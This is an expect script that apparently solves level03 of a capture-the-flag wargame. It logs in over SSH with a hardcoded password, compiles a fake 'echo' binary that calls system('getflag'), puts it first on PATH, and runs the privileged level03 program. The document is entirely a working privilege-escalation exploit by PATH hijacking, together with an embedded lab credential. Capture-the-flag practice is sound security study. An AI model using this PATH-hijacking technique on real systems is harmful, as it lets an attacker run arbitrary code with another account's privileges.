#!/usr/bin/expect -f
set ip 192.168.1.103
spawn ssh -o "StrictHostKeyChecking no" level03@$ip -p 4242 "mkdir -p /tmp/level03 ; cd /tmp/level03 ; chmod 777 . ; echo 'void main(void) \{ system\(\"getflag\"\)\; \}' > echo.c ; gcc echo.c -o echo ; PATH=/tmp/level03:\$PATH ; ~/level03"
expect "sword:"
send "kooda2puivaav1idi4f57q8iq\r"
interact
